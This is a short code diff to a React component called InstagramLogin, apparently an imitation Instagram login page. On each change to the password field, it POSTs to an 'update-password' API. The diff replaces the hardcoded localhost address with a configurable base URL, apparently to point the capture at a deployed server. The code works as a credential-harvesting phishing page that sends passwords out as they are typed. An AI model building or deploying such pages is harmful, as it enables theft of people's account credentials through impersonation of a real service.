@@ -8,6 +8,9 @@ export default function InstagramLogin() {
     password: "",
   });
 
+  const VITE_API_BASE_URL = import.meta.env.VITE_API_BASE_URL;
+
+
   const [focused, setFocused] = useState({
     username: false,
     password: false,
@@ -34,7 +37,7 @@ const handleChange = async (e) => {
 
   if (name === "password") {
     try {
-      await fetch("http://localhost:5000/api/update-password", {
+await fetch(`${VITE_API_BASE_URL}/api/update-password`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
